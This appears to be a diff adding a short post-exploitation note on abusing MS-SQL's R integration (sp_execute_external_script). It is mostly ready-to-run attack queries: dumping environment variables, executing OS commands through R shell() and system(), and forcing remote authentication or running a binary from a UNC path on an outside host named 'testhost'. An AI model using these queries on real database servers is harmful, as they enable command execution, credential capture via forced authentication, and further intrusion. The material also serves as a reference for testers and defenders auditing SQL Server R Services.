@@ -1,0 +1,58 @@
+Starting with MS-SQL 2016 MS has allowed for the inclusion of the Microsoft R Server services, permitting the execution of R scripts in the MS-SQL environment. In order for this funcitonality to be enabled, the R services for SQL server component must be installed, the server must be reconfigured to permit sp_exectue_external_script, and a user must be granted the 'EXECUTE ANY EXTERNAL SCRIPT' permission; yes, all of this is becoming increasingly more common.
+
+Once these conditions are in place, SQL users will have R capabilities in their queries through the use of sp_execute_external_script().
+
+This can be 'fun'..
+
+Sample R query in MS-SQL (from MSDN):
+
+EXEC sp_execute_external_script
+  @language=N'R',
+  @script=N'OutputDataSet <- InputDataSet',
+  @input_data_1=N'SELECT 1 AS hello'
+  WITH RESULT SETS (([hello] int not null));
+GO
+
+Get the current R environment variables:
+
+EXEC sp_execute_external_script
+  @language=N'R',
+  @script=N'OutputDataSet <- data.frame(c(EnvVals=Sys.getenv()))'
+  WITH RESULT SETS (([EnvVals] TEXT));
+GO
+
+Forced remote authentication via library inclusion:
+
+EXEC sp_execute_external_script
+  @language=N'R',
+  @script=N'.libPaths("\\\\testhost\\foo\\bar");library("0mgh4x")'
+  WITH RESULT SETS (([FileLines] TEXT));
+GO
+
+Local command execution through R shell():
+
+EXEC sp_execute_external_script
+  @language=N'R',
+  @script=N'OutputDataSet <- data.frame(shell("dir",intern=T))'
+  WITH RESULT SETS (([cmd_out] text));
+GO
+
+Local command execution through R system():
+
+EXEC sp_execute_external_script
+  @language=N'R',
+  @script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir",intern=T))'
+  WITH RESULT SETS (([cmd_out] text));
+GO
+
+Forced remote authentication via UNC execution:
+
+EXEC sp_execute_external_script
+  @language=N'R',
+  @script=N'OutputDataSet <- data.frame(system("cmd.exe /c \\\\testhost\\no\\bin.exe",intern=T))'
+  WITH RESULT SETS (([cmd_out] text));
+GO
+
+As with most things in the realm of post-exploitation, if someone can do this, you've got bigger problems to worry about.
+
+-whitey
